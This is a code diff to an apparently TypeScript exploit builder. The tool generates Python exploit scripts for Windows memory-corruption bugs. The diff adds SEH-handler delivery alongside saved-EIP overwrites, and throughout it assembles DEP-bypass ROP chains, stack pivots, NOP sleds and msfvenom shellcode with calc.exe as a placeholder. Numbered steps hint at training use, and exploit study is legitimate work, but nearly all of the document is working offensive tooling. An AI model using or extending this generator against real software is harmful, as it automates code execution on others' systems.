@@ -7,6 +7,7 @@ import { MAX_HOPS, Path, ReachIndex, Reg, Unreached, Val, constVal, describe, ef
 import { copyBytes, FRAMES, FrameFacts, frameGoal, PUSHAD_FRAMES, PUSHAD_TAIL, Slot, WPM_MIN_COPY } from "./dep_frames";
 import { DepPlanStyle, JobPlan, LARGE_STACK_MOVE, Verdict, fieldRegister, gadgetAddress, hex32, holds, memoryWrites, movesEsp, sequence, sideEffects, stackMove, writtenRegisters } from "./dep_plan";
 import { DepApi } from "./rop_template";
+import { Delivery, deliveryLines, sehHoles } from "./dep_delivery";
 
 // One row per gadget the chain uses. Every block is a rendering of this table.
 export type Entry = { name: string; address: number; sequence: string; pops: number; retn: number; job: string; loads: number };
@@ -80,6 +81,8 @@ export type BuildInput = {
   stage: number;
   /** Measured at the crash by measureLanding; absent means 0, the plain ret. */
   landing?: Landing;
+  /** How the chain reaches its first gadget; absent means the saved EIP. */
+  delivery?: Delivery;
 };
 
 /** The API reached from a neighbouring import of the same DLL, measured live: right for this build only. */
@@ -229,6 +232,10 @@ export function buildExploit(input: BuildInput): Build {
   const JUNK = filler(badchars);
   const gap = input.landing?.gap ?? 0;
   const retGap = `RET_GAP = ${gap}${" ".repeat(Math.max(1, 25 - String(gap).length))}# ${input.landing?.how ?? "not measured: assumed 0, a plain ret"}`;
+  const delivery: Delivery = input.delivery ?? { kind: "ret" };
+  // Where the chain starts in the payload, and RET_GAP with it. Every position the chain computes is
+  // CHAIN_AT plus something, so only this changes between a saved EIP and an SEH handler.
+  const placed = (lead: string): string[] => deliveryLines(delivery, lead, retGap);
   // STAGING plus an offset, as the chain's own text. The frame's base is a name the copy block defines,
   // so a reader sees which field each popped dword is instead of subtracting the write gadget's
   // displacement from a literal by hand.
@@ -665,7 +672,7 @@ export function buildExploit(input: BuildInput): Build {
           const from = capture.at.dest ?? "";
           const route = cheapest([from, ...REGISTERS.filter((r) => r !== from && keep.indexOf(r) < 0)].map((at) => {
             const there = moveOps(from, at, keep);
-            const sled = there ? sledOps(at, keep, "OFFSET + 4 * here") : undefined;
+            const sled = there ? sledOps(at, keep, "CHAIN_AT + 4 * here") : undefined;
             const back = sled ? moveOps(at, register, keep) : undefined;
             return there && sled && back ? { there, sled, back } : undefined;
           }));
@@ -708,7 +715,7 @@ export function buildExploit(input: BuildInput): Build {
   // negates what it pops. The gap grows until every patch has clean dwords, and a patch of two takes a
   // pair that adds up to the distance, so a value no single dword can carry is still sent.
   const SLED: Op[] = [
-    { line: "chain_end = OFFSET + 4 * len(c)" },
+    { line: "chain_end = CHAIN_AT + 4 * len(c)" },
     { line: "def to_sled(base, gap, negated):    # what the pops need, so the value lands on the NOPs" },
     { line: "    distance = chain_end + gap - base" },
     { line: "    return neg(distance) if negated else distance" },
@@ -762,8 +769,8 @@ export function buildExploit(input: BuildInput): Build {
         const value = literal(slot) ?? hex(dummies[i]);
         return `frame ${i === 0 ? " =" : "+="} p32(${value})${" ".repeat(Math.max(1, 14 - value.length))}# ${slot.name}${literal(slot) ? "" : ", patched by the chain"}`;
       }),
-      "FRAME_AT = OFFSET - len(frame)     # field 1 sits here, so the chain starts on EIP",
-      retGap,
+      ...placed("len(frame)"),
+      "FRAME_AT = CHAIN_AT - len(frame)   # field 1 sits here, right below the chain",
     ];
     const keepField: Op[] | undefined = copy && !copy.move ? [{ call: entry(copy.gadget, "keep the field address"), values: [] }]
       : !copy && copyPath ? copyPath.gadgets.map((gadget) => ({ call: entry(gadget, `move ${copyPath.from} into ${copyPath.to}`), values: [] })) : undefined;
@@ -772,11 +779,11 @@ export function buildExploit(input: BuildInput): Build {
     } else {
       const fns = frame.map((slot) => literal(slot) ? undefined : defineLoader(slot, valueRegister, [field]));
       chain.push(group("the captured ESP, and the address of field 1"));
-      chain.push({ line: `# ${field} = field 1 - ${hex(writeOffset)}: the captured ESP is buffer offset OFFSET + 4 + RET_GAP, field 1 is FRAME_AT` });
+      chain.push({ line: `# ${field} = field 1 - ${hex(writeOffset)}: the captured ESP is buffer offset CHAIN_AT + 4 + RET_GAP, field 1 is FRAME_AT` });
       chain.push({ line: `# confirm: bp ${hex(gadgetAddress(capture.gadget))} ; g ; r esp ; s -d esp-400 L100 ${(dummies[0] >>> 0).toString(16)}` });
       chain.push({ call: entry(capture.gadget, "capture ESP"), values: [] });
-      // The captured ESP is the buffer at OFFSET + 4 + RET_GAP and field 1 is FRAME_AT, len(frame) below
-      // OFFSET, so the distance is known now and goes through the same search as any value.
+      // The captured ESP is the buffer at CHAIN_AT + 4 + RET_GAP and field 1 is FRAME_AT, len(frame) below
+      // CHAIN_AT, so the distance is known now and goes through the same search as any value.
       // Onto the captured ESP before the copy, or onto the copy when the captured register has no add.
       const distance = -(4 * frame.length + 4 + gap + writeOffset);
       const before = offsetBy(capture.at.dest ?? "", distance, [], "field 1", add?.gadget);
@@ -844,7 +851,7 @@ export function buildExploit(input: BuildInput): Build {
     frameBlock = staging === undefined ? [] : [
       `STAGING = ${hex(staging)}      # the frame is laid here: ${span} writable bytes in ${input.module}`,
       ...frame.map((slot, i) => `#   ${stagingText(4 * i).padEnd(22)}${slot.name}${i === 0 ? "   <- the pivot's ret enters the call here" : ""}`),
-      retGap,
+      ...placed("0"),
     ];
     if (staging === undefined || !write || !pivot) {
       chain.push(...hole("payload", staging === undefined
@@ -890,7 +897,7 @@ export function buildExploit(input: BuildInput): Build {
         group("the shellcode address, into the slot the loader marked"),
         ...SLED,
         { line: "" },
-        { line: "payload  = PAD * OFFSET + b\"\".join(p32(w) for w in c)" },
+        { line: "payload  = PAD * CHAIN_AT + b\"\".join(p32(w) for w in c)" },
         { line: "payload += PAD * gap + nops + shellcode" },
       );
     }
@@ -918,7 +925,7 @@ export function buildExploit(input: BuildInput): Build {
       loaded.push(slot.register ?? "eax");
       return fn;
     });
-    frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot) => `${slot.register} = ${slot.name}`).join(", ")}`, retGap];
+    frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot) => `${slot.register} = ${slot.name}`).join(", ")}`, ...placed("0")];
     const dispatch = pick("pushad");
     chain.push(group("the seven registers, in the order [6/7] fixes"));
     // One line per register, so the [7/7] screenshot shows the route each one took without scrolling to
@@ -951,7 +958,7 @@ export function buildExploit(input: BuildInput): Build {
       chain.push(group("the dwords the call reads after the pushad gadget"));
       chain.push({ line: `c.extend([${tail.join(", ")}])` });
     }
-    chain.push({ line: "" }, { line: "payload = PAD * OFFSET + b\"\".join(p32(w) for w in c) + nops + shellcode" });
+    chain.push({ line: "" }, { line: "payload = PAD * CHAIN_AT + b\"\".join(p32(w) for w in c) + nops + shellcode" });
   }
 
   assignNames(table);
@@ -986,15 +993,16 @@ export function buildExploit(input: BuildInput): Build {
       ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
       ...(sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : []),
       "c = Chain()",
-      "c.skip = RET_GAP                 # junk after the first gadget for the bytes the crashing ret skips: [6/7]",
+      "c.skip = RET_GAP                 # junk after the first gadget for the bytes the ret into it skips: [6/7]",
       ...render(chain, ""),
+      ...(delivery.kind === "seh" ? ["payload = seh_record(payload)   # nSEH and the handler at OFFSET: [6/7]"] : []),
       "return sendable(payload)",
     ].map((line) => (line === "" ? "" : `    ${line}`)),
   ];
   return {
     table,
     stages,
-    holes: slot.hole ? [slot.hole, ...holes] : holes,
+    holes: [...(slot.hole ? [slot.hole] : []), ...holes, ...sehHoles(delivery)],
     routes: routes.map(resolve),
     blocks: {
       1: HELPER_BLOCK,
